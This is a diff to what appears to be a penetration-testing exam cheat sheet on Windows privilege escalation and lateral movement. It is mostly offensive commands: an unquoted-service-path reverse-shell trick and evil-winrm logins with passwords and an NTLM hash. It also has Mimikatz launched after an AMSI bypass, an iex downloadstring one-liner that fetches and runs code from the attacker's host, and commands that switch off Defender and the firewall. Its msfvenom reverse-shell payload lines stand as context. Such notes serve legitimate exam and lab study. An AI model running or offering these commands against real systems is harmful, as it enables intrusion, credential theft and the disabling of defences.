@@ -846,7 +846,7 @@ whoami
 - If the path to the service binary is not enclosed in quotes and contains white spaces, the name of a loophole for an installed service is Service Unquoted Path. As a result, a local user will be able to elevate the privilege to administrator privilege shell by placing an executable in a higher level directory within the path.
 - Detection: `./PowerUp.ps1` -> Get-UnquotedService
 - Detection outcome and Precondition: under ModifiablePath -> BUILTIN\Users, and then checks if any binary paths have a space and aren’t quoted.
-- Precondition check: `icalcs "C:\Program Files\Unquoted Path Service"`, to check that BUILTIN\Users has WRITE permission
+- Precondition check: `icalcs "C:\Program Files\Unquoted Path Service"`, to check that BUILTIN\Users has WRITE or FULL CONTROL permission
 - Exploitation: if the path is `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`, then craft reverse shell exploit called common.exe and place in any of the sub directories in C:\Program Files\Unquoted Path Service\Common Files . To trigger the exploit use 'net start *ServiceName*' and then run netcat listener on kali.
 
 11. runas
@@ -1341,28 +1341,6 @@ Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accou
 Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
 ```
 
-### EvilWinRM (used when port 5985 is open)
-```bash
-#grab shell in attacker's kali
-evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
-evil-winrm -i 192.168.1.19 -u administrator -H 32196B56FFE6F45E294117B91A83BF38
-
-#run mimikatz from evil-winrm
-evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell
-Bypass-4MSI
-Invoke-Mimikatz.ps1
-Invoke-Mimikatz
-
-#run winPEAS
-evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc
-Bypass-4MSI
-menu
-Invoke-Binary /opt/privsc/winPEASx64.exe
-
-#upload files
-upload /root/notes.txt .
-```
-
 ### Bloodhound (Install before exam, snapshot VM before installing)
 
 - Collection methods - database
@@ -1500,10 +1478,24 @@ dir \\web04\admin$
 - Gives persistent shell. Crackmapexec doesnt.
 - Installation: `gem install evil-winrm`
 - Get powershell access using: `evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!'`
-- Send file from kali to window: `upload <kali directory and filename> <windows destination directory and filename>`
-- Send file from window to kali: `download <windows destination directory and filename> <kali directory and filename>`
+- to see what command you can run: `menu`
 
+```bash
+#run scripts stored in kali's /opt/privsc/powershell directory, from evil-winrm
+evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell
+Bypass-4MSI
+Invoke-Mimikatz.ps1
+Invoke-Mimikatz
 
+#run winPEAS
+evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc
+Bypass-4MSI
+menu
+Invoke-Binary /opt/privsc/winPEASx64.exe
+```
+- Send file from kali to window(on kali running PS): `upload <kali directory and filename> <windows destination directory and filename>`
+- Send file from kali (python http server) to windows (on kali running PS): `iex(new-object net.webclient).downloadstring('kali address:port/file')`
+- Send file from window to kali(on kali running PS) : `download <windows destination directory and filename> <kali directory and filename>`
 
 ## PSexec (lateral movement)
 
@@ -1764,6 +1756,12 @@ msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f asp > shell.as
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f war > shell.war
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f raw > shell.jsp
 ```
+
+### What to do after you are Windows Admin in Powershell
+Disable realtime monitoring: `Set-MpPreference -DisableRealtimeMonitoring $true`
+Disable AV: `Set-MpPreference -DisableIOAVProtection $true`
+off states: `netsh advfirewall set allprofiles state off`
+
 
 ### MSFVenom Reverse Shell Payload Cheatsheet (see stageless)
 - https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
